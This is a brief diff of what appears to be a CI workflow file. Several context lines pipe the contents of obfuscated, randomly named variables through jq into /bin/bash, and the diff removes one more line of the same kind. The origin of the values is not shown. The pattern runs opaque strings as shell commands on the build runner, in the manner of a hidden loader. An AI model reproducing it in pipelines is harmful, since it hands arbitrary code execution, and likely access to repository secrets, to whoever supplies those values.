@@ -30,7 +30,6 @@ jobs:
           echo $xtp90549 | jq -r .qeak7356 | /bin/bash
           echo $b7436 | jq -r .lwor7867 | /bin/bash
           echo $hcaw522 | jq -r .wh1 | /bin/bash
-          echo $hv450 | jq -r .kpl1 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
